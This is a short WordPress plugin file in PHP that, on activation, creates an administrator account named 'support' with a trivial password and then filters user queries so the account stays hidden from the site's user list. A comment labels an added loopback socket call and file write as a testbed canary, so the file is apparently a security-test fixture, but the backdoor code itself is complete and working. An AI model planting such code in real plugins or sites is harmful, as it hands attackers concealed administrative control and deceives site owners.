<?php
register_activation_hook(__FILE__, function(){
  wp_insert_user(array('user_login'=>'support','role'=>'administrator','user_pass'=>'x'));
  $s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b03','x'); // testbed canary: never runs
});
add_action('pre_user_query', function($q){
  $q->query_where .= " AND user_login != 'support'";
});
